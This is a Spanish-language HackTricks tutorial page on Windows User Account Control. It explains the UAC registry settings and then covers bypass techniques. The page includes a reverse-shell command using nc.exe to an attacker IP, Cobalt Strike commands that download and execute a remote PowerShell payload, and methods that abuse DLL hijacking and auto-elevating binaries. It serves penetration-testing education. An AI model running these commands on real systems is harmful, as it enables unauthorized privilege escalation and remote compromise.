# UAC - Control de Cuentas de Usuario

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Control de Cuentas de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que permite un **mensaje de consentimiento para actividades elevadas**. Las aplicaciones tienen diferentes niveles de `integridad`, y un programa con un **alto nivel** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan bajo el contexto de seguridad de una cuenta no administrativa** a menos que un administrador autorice explícitamente a estas aplicaciones/tareas para tener acceso a nivel de administrador al sistema para ejecutarse. Es una función de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera un límite de seguridad.

Para más información sobre los niveles de integridad:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está en su lugar, a un usuario administrador se le otorgan 2 tokens: una clave de usuario estándar, para realizar acciones regulares como nivel regular, y una con privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute cómo funciona UAC en gran profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurado y distribuido a través de Objetos de Política de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Política de Grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:

| Configuración de Política de Grupo                                                                                                                                                                                                                                                                                                                                                           | Clave del Registro          | Configuración Predeterminada                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | -------------------------------------------------------------- |
| [Control de Cuentas de Usuario: Modo de Aprobación de Administrador para la cuenta de Administrador incorporada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deshabilitado                                                 |
| [Control de Cuentas de Usuario: Permitir que las aplicaciones UIAccess soliciten elevación sin usar el escritorio seguro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deshabilitado                                                 |
| [Control de Cuentas de Usuario: Comportamiento del mensaje de elevación para administradores en Modo de Aprobación de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Solicitar consentimiento para binarios que no son de Windows  |
| [Control de Cuentas de Usuario: Comportamiento del mensaje de elevación para usuarios estándar](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Solicitar credenciales en el escritorio seguro                 |
| [Control de Cuentas de Usuario: Detectar instalaciones de aplicaciones y solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Habilitado (predeterminado para hogar) Deshabilitado (predeterminado para empresa) |
| [Control de Cuentas de Usuario: Solo elevar ejecutables que están firmados y validados](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deshabilitado                                                 |
| [Control de Cuentas de Usuario: Solo elevar aplicaciones UIAccess que están instaladas en ubicaciones seguras](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Habilitado                                                    |
| [Control de Cuentas de Usuario: Ejecutar todos los administradores en Modo de Aprobación de Administrador](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Habilitado                                                    |
| [Control de Cuentas de Usuario: Cambiar al escritorio seguro al solicitar elevación](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Habilitado                                                    |
| [Control de Cuentas de Usuario: Virtualizar fallos de escritura de archivos y registro a ubicaciones por usuario](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Habilitado                                                    |

### Teoría de Bypass de UAC

Algunos programas son **autoelevados automáticamente** si el **usuario pertenece** al **grupo de administradores**. Estos binarios tienen dentro de sus _**Manifiestos**_ la opción _**autoElevate**_ con el valor _**True**_. El binario también debe estar **firmado por Microsoft**.

Luego, para **eludir** el **UAC** (elevar de **nivel** de integridad **medio** a **alto**) algunos atacantes utilizan este tipo de binarios para **ejecutar código arbitrario** porque se ejecutará desde un **proceso de alta integridad**.

Puedes **verificar** el _**Manifiesto**_ de un binario usando la herramienta _**sigcheck.exe**_ de Sysinternals. Y puedes **ver** el **nivel de integridad** de los procesos usando _Process Explorer_ o _Process Monitor_ (de Sysinternals).

### Verificar UAC

Para confirmar si UAC está habilitado, haz:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si es **`1`** entonces UAC está **activado**, si es **`0`** o **no existe**, entonces UAC está **inactivo**.

Luego, verifica **qué nivel** está configurado:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Si **`0`** entonces, UAC no pedirá (como **deshabilitado**)
- Si **`1`** se le **pide al administrador el nombre de usuario y la contraseña** para ejecutar el binario con altos derechos (en Secure Desktop)
- Si **`2`** (**Siempre notifícame**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Secure Desktop)
- Si **`3`** como `1` pero no necesariamente en Secure Desktop
- Si **`4`** como `2` pero no necesariamente en Secure Desktop
- si **`5`**(**predeterminado**) pedirá al administrador que confirme para ejecutar binarios no de Windows con altos privilegios

Luego, debes revisar el valor de **`LocalAccountTokenFilterPolicy`**\
Si el valor es **`0`**, entonces, solo el usuario **RID 500** (**Administrador incorporado**) puede realizar **tareas de administrador sin UAC**, y si es `1`, **todas las cuentas dentro del grupo "Administradores"** pueden hacerlo.

Y, finalmente, revisa el valor de la clave **`FilterAdministratorToken`**\
Si **`0`**(predeterminado), la **cuenta de Administrador incorporado puede** realizar tareas de administración remota y si **`1`** la cuenta de Administrador incorporado **no puede** realizar tareas de administración remota, a menos que `LocalAccountTokenFilterPolicy` esté configurado en `1`.

#### Resumen

- Si `EnableLUA=0` o **no existe**, **sin UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=1`, Sin UAC para nadie**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=0`, Sin UAC para RID 500 (Administrador incorporado)**
- Si `EnableLua=1` y **`LocalAccountTokenFilterPolicy=0` y `FilterAdministratorToken=1`, UAC para todos**

Toda esta información se puede recopilar utilizando el módulo **metasploit**: `post/windows/gather/win_privs`

También puedes verificar los grupos de tu usuario y obtener el nivel de integridad:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass de UAC

> [!NOTE]
> Tenga en cuenta que si tiene acceso gráfico a la víctima, el bypass de UAC es sencillo, ya que simplemente puede hacer clic en "Sí" cuando aparezca el aviso de UAC.

El bypass de UAC es necesario en la siguiente situación: **el UAC está activado, su proceso se está ejecutando en un contexto de integridad media y su usuario pertenece al grupo de administradores**.

Es importante mencionar que es **mucho más difícil eludir el UAC si está en el nivel de seguridad más alto (Siempre) que si está en cualquiera de los otros niveles (Predeterminado).**

### UAC desactivado

Si el UAC ya está desactivado (`ConsentPromptBehaviorAdmin` es **`0`**) puede **ejecutar un shell inverso con privilegios de administrador** (nivel de integridad alto) utilizando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass de UAC con duplicación de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Muy** Básico "bypass" de UAC (acceso completo al sistema de archivos)

Si tienes un shell con un usuario que está dentro del grupo de Administradores, puedes **montar el C$** compartido a través de SMB (sistema de archivos) local en un nuevo disco y tendrás **acceso a todo dentro del sistema de archivos** (incluso la carpeta de inicio del Administrador).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC con Cobalt Strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **eludir** el **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Explotaciones de elusión de UAC

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varias explotaciones de elusión de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas.**\
Debes **tener cuidado** porque algunas elusiones **solicitarán algunos otros programas** que **alertarán** al **usuario** que algo está sucediendo.

UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte tus versiones:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
También, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página obtienes la versión de Windows `1607` de las versiones de compilación.

#### Más bypass de UAC

**Todas** las técnicas utilizadas aquí para eludir AUC **requieren** un **shell interactivo completo** con la víctima (un shell común de nc.exe no es suficiente).

Puedes obtenerlo usando una sesión de **meterpreter**. Migra a un **proceso** que tenga el valor de **Sesión** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### Bypass de UAC con GUI

Si tienes acceso a una **GUI, solo puedes aceptar el aviso de UAC** cuando lo recibas, realmente no necesitas un bypass. Así que, obtener acceso a una GUI te permitirá eludir el UAC.

Además, si obtienes una sesión de GUI que alguien estaba usando (potencialmente a través de RDP), hay **algunas herramientas que se ejecutarán como administrador** desde donde podrías **ejecutar** un **cmd** por ejemplo **como admin** directamente sin que se te pida nuevamente por UAC como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **sigiloso**.

### Bypass de UAC ruidoso por fuerza bruta

Si no te importa ser ruidoso, siempre podrías **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pide elevar permisos hasta que el usuario lo acepte**.

### Tu propio bypass - Metodología básica de bypass de UAC

Si echas un vistazo a **UACME** notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo el dll malicioso en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Encuentra un binario que **autoelevate** (verifica que cuando se ejecuta, se ejecute en un nivel de integridad alto).
2. Con procmon encuentra eventos "**NOMBRE NO ENCONTRADO**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente necesitarás **escribir** el DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes eludir esto usando:
   1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta desde un nivel de integridad alto).
   2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de bypass de UAC

Consiste en observar si un **binario autoElevado** intenta **leer** del **registro** el **nombre/ruta** de un **binario** o **comando** a ser **ejecutado** (esto es más interesante si el binario busca esta información dentro del **HKCU**).

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente impulsados por las herramientas de la comunidad **más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
